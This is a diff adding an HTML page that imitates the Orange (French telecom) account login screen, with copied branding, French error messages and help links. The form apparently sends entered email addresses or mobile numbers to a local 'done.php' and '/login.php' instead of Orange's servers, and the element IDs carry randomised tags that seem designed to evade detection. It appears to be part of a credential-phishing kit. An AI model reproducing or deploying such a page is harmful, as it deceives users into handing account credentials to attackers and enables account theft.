@@ -1,0 +1,60 @@
+<!doctypehtml><html lang=fr><head data-placeholder-focus=false><meta charset=utf-8><meta content=IE=edge http-equiv=X-UA-Compatible><meta content=none name=msapplication-config><meta content=width=device-width,initial-scale=1 name=viewport><meta content=telephone=no name=format-detection><title>
+   Identifiez-vous avec votre compte Orange
+  </title><noscript><style>body {
+                display: none;
+            }</style> <meta content="0; url=/assistance"http-equiv=refresh></noscript><meta content=yes name=apple-mobile-web-app-capable><meta content=yes name=mobile-web-app-capable><link href=icons/apple-touch-icon-57x57.png rel=apple-touch-icon sizes=57x57><link href=icons/apple-touch-icon-60x60.png rel=apple-touch-icon sizes=60x60><link href=icons/apple-touch-icon-72x72.png rel=apple-touch-icon sizes=72x72><link href=icons/apple-touch-icon-76x76.png rel=apple-touch-icon sizes=76x76><link href=icons/apple-touch-icon-114x114.png rel=apple-touch-icon sizes=114x114><link href=icons/apple-touch-icon-120x120.png rel=apple-touch-icon sizes=120x120><link href=icons/apple-touch-icon-144x144.png rel=apple-touch-icon sizes=144x144><link href=icons/apple-touch-icon-152x152.png rel=apple-touch-icon sizes=152x152><link href=icons/apple-touch-icon-180x180.png rel=apple-touch-icon sizes=180x180><link href=icons/favicon-32x32.png rel=icon sizes=32x32 type=image/png><link href=icons/favicon-194x194.png rel=icon sizes=194x194 type=image/png><link href=icons/favicon-96x96.png rel=icon sizes=96x96 type=image/png><link href=icons/android-chrome-36x36.png rel=icon sizes=36x36 type=image/png><link href=icons/android-chrome-48x48.png rel=icon sizes=48x48 type=image/png><link href=icons/android-chrome-72x72.png rel=icon sizes=72x72 type=image/png><link href=icons/android-chrome-96x96.png rel=icon sizes=96x96 type=image/png><link href=icons/android-chrome-144x144.png rel=icon sizes=144x144 type=image/png><link href=icons/android-chrome-192x192.png rel=icon sizes=192x192 type=image/png><link href=icons/favicon-16x16.png rel=icon sizes=16x16 type=image/png><link href=css/bundle.min.css rel=stylesheet><style>.eui-banner {
+                background-image: url("icons/om_desktop.png");
+            }
+
+            .eui-banner-mc {
+                background-image: url("icons/mc_desktop_old.png");
+            }
+            #promoteMCicon{
+                background: url("icons/promoteMCDesktop.gif") no-repeat;
+                background-size: 100%;
+                height: 32rem;
+                width: 30rem;
+            }
+
+            @media (max-width: 767px) {
+                .eui-banner {
+                    background-image: url("icons/om_mobile.png");
+                }
+
+                .eui-banner-mc {
+                    background-image: url("icons/mc_mobile_old.png");
+                }
+
+                #promoteMCicon {
+                    background: url("icons/promoteMCMobile.gif") no-repeat;
+                    background-size: 100%;
+                    height: 15rem;
+                    width: 30.2rem;
+                }
+            }
+
+            .off-screen {
+                position: fixed;
+                bottom: 0;
+                right: 0;
+                height: 0 !important;
+                width: 0 !important;
+                overflow: hidden;
+                opacity: 0;
+                filter: alpha(opacity=0);
+            }
+            #forceMCLabel.disabled, #forceMCLabelBis.disabled  {
+                display: none;
+            }</style><script>window.Eui = {
+        params: {"return_url":"https:\/\/www.orange.fr\/portail"},
+        headers: {"content-type":"application\/json"},
+        apiConfig: {"baseUrl":"front","timeout":15000,"retry":20,"resources":{"login":{"path":"/login.php","method":"POST"},"password":{"path":"\/password","method":"POST"},"challenge":{"path":"\/challenge","method":"POST"},"captcha":{"path":"\/captcha","method":"POST"},"keepConnected":{"path":"\/keep-connected","method":"POST"},"reauthentication":{"path":"\/reauthentication","method":"POST"},"accounts":{"path":"\/accounts","method":"GET"},"probe":{"path":"\/report\/probe","method":"POST"},"confirm":{"path":"\/confirm","method":"POST"},"await":{"path":"\/await","method":"GET"},"reportError":{"path":"\/report\/error","method":"POST"},"deactivate":{"path":"\/deactivate","method":"POST"},"promoteLaterMC":{"path":"\/promoteLaterMC","method":"POST"},"activateMC":{"path":"\/activateMC","method":"POST"},"authToken":{"path":"\/authToken","method":"POST"},"authCookie":{"path":"\/authCookie","method":"GET"}}},
+        i18n: {errors: {"408":"Le service a rencontr\u00e9 un probl\u00e8me r\u00e9seau, veuillez r\u00e9essayer.","503":"Cette page rencontre un probl\u00e8me technique, r\u00e9essayez un peu plus tard.","100":"Vous n\u2019avez pas indiqu\u00e9 l\u2019adresse mail ou le num\u00e9ro de mobile de votre compte Orange.","101":"Cette adresse mail ou ce num\u00e9ro de mobile n\u2019est pas valide. V\u00e9rifiez votre saisie.","102":"Vous n\u2019avez pas saisi votre mot de passe.","104":"C\u2019est incorrect, v\u00e9rifiez l\u2019adresse mail et le mot de passe saisis.","105":"Pour vous permettre de vous identifier votre navigateur doit accepter les cookies. <a href=\"https:\/\/r.orange.fr\/r\/Oid_cookies\" target=\"_self\" title=\"En savoir plus.\">En savoir plus.<\/a>","106":"Champ obligatoire"}, labels: {"titlePassAssistShow":"afficher le mot de passe","titlePassAssistHide":"cacher le mot de passe"}},
+        mem: true,
+        ad: true,
+        stage: 'login',
+        templateErrorTech: "<div class=\"row\">    <div class=\"col-xs-12 col-md-12 col-lg-11 col-xl-9\">        <div class=\"eui-error-area\">            <div class=\"zone-icon\">                <div class=\"eui-svg eui-icon-warning\"><\/div>            <\/div>            <div class=\"zone-msg\">                <p id=\"msgWarning\">Vous \u00eates rest\u00e9 longtemps inactif.<\/p>            <\/div>            <div class=\"zone-msg-btm\">                <p id=\"msgAction\">Vous pouvez recommencer<\/p>            <\/div>            <div class=\"clearfix\"><\/div>            <button id=\"btnRefresh\" type=\"button\" class=\"btn btn-info eui-btn-sub\">Recommencer<\/button>        <\/div>    <\/div><\/div>",
+        templateAuthToken: "",
+        ttls: 3600,
+        reportError:  true,
+      };</script><script>var o_confCommon = {"centeredPage":true,"genericHeaderZone":false,"infoCookieZone":false,"persoZone":false,"typeEnv":"prod","tracking":{"Tealium":{"deactivate":false,"profile":"identite"},"Gstat":{"useServerRedirect":false}},"login":{"disabled":true}}; var o_data =  {"domaine":"Identit\u00e9","canal":"Web, Mobile Web","couleur":"Orange","univers_affichage":"Formulaire","segment":"RES"};</script><script src=js/bundle.min.js></script><body><a href=https://login.orange.fr/?return_url=https://www.orange.fr/portail> <img src=icons/front.png> </a><main class=eui-container role=main><div class="o-container-fluid eui-title-area"><div class=row><div class="col-xs-12 col-md-8 col-lg-8 col-xl-8"><h1 id="12310-xX666Xx-9246  title">Identifiez-vous</h1></div></div></div><div class=o-container-fluid><div class=row><div class="col-xs-12 col-md-6 col-lg-6 col-xl-6"><div id=stage><form action=done.php class=eui-form id=euiForm novalidate><div id=eui-accounts></div><div class=form-group><h2 class=sr-only>Indiquez votre compte Orange</h2><div class=eui-input-label><div class=eui-row><label class=eui-label for=login id=loginLabel>Indiquez votre compte Orange</label><div class=eui-assistance-area><button class="eui-svg eui-icon-help"data-oevent=idme_login;clic_bulle_aide_saisie;bulle_aide_saisie id=helpLogin type=button><span class=sr-only> aide </span></button></div></div></div><div style="display : none;"aria-label=aide class=eui-help id=helpLoginCnt><p class=noSelectContent tabindex=-1><span> Votre compte Orange permet l’accès à vos services personnels. Il est désigné par une adresse e-mail ou un numéro de mobile. </span> <br> <span> C’est votre première visite >> <a href=/aide title=Aide> Aide </a> </span></div><h6 aria-live=assertive class=form-control-message id=error-msg-box-login role=alert tabindex=0 title=erreur></h6><input placeholder="Adresse mail ou n° de mobile Orange"aria-describedby=error-msg-box-login aria-invalid autocapitalize=off autocorrect=off class=form-control id=login maxlength=256 spellcheck=false></div><button class="btn btn-info eui-btn-sub"style="visibility: hidden;"id=btnSubmit>Continuer</button></form><nav class="eui-links row"role=navigation><div class="col-xs-12 col-md-12 col-lg-12 col-xl-12"id=firstAuthentBloc><a title="Vous vous identifiez pour la première fois  ?"data-oevent=idme_login;clic_premiere_connexion;lien_premiere_connexion href=/firstConnection?return_url=https%3A%2F%2Fwww.orange.fr%2Fportail id=firstAuthentLink> Vous vous identifiez pour la première fois ? </a></div><div class="col-xs-12 col-md-12 col-lg-12 col-xl-12"id=firstAccessDiv><a title="Vous n’êtes pas client ? Créer votre compte"data-oevent=idme_login;clic_créer_compte;créer_votre_compte href=https://r.orange.fr/r/Oid_signup?return_url=https://www.orange.fr/portail id=firstAccessLink> Vous n’êtes pas client ? Créer votre compte </a></div><div class="col-xs-12 col-md-12 col-lg-12 col-xl-12"style="display: none;"id=forgotCodeMC><a title="Code confidentiel oublié ?"href=# id=forgotCodeMCLink> Code confidentiel oublié ? </a></div><div class="col-xs-12 col-md-12 col-lg-12 col-xl-12"style="display: none"id=discoverMC><a href=https://mc.orange.fr?return_url=https%3A%2F%2Fwww.orange.fr%2Fportail id=discoverMCLink> <img id=discoverMCLinkImg src=icons/Logo_MC_noir_fond_transparent_small.png> <img style="display: none;"id=discoverMCLinkImgHover src=icons/Logo_MC_orange_fond_transparent_small.png> Comment s’identifier plus vite et plus facilement ? </a></div><div class="col-xs-12 col-md-12 col-lg-12 col-xl-12"id=moreHelpLink><a title="Besoin d’aide ?"data-oevent-action=clic_aide data-oevent-category=idme_login data-oevent-label=aide href=/aide?return_url=https%3A%2F%2Fwww.orange.fr%2Fportail id=helpLink> Besoin d’aide ? </a></div><div class="col-xs-12 col-md-12 col-lg-12 col-xl-12"style="display: none;"id=authWithoutMCDiv><a title="S’identifier avec votre mot de passe"class=link-action-password data-oevent-action=clic_sidentifier_sans_mc data-oevent-category=idme_mc_invit data-oevent-label=sidentifier_sans_mc href=# id=authWithoutMCLink> S’identifier avec votre mot de passe </a></div><div class="eui-help col-xs-12 disabled"id=forceMCLabel>Par sécurité, vous devez vous identifier avec Mobile Connect. <button class="eui-svg eui-close eui-icon-close-grey"type=button><span class=sr-only> fermer </span></button></div><div class="eui-help col-xs-12 disabled"id=forceMCLabelBis>Suite à plusieurs tentatives d’accès erronées, l’accès à ce compte par mot de passe est temporairement bloqué. Réessayez un peu plus tard. <button class="eui-svg eui-close eui-icon-close-grey"type=button><span class=sr-only> fermer </span></button></div></nav></div></div><div class="eui-banner-place col-xs-12 col-md-5 col-lg-4 col-xl-4 col-md-offset-1"id="9852-xX666Xx-9954  magicZone"><a id="9327-xX666Xx-11760  magicZoneLink"rel="noopener noreferrer"class=eui-block data-oevent-action=clic_zone_com data-oevent-category=idme_login data-oevent-label=service href=https://r.orange.fr/r/Oapp_Orange_EtMoi target=_blank> <div title="Lien zone de communication (nouvel onglet)"class=eui-banner id=elmt-banner></div> </a></div></div></div></main><footer><div class="eui-footer-banner hidden-xs hidden-sm"><div class="eui-mega-banner oan_ad"id="9223-xX666Xx-9357  ora_2_728x90_identification"></div></div><a href=https://login.orange.fr/?return_url=https://www.orange.fr/portail> <img src=icons/end.png> </a><div id="11424-xX666Xx-10367  cefooter"></div></footer>
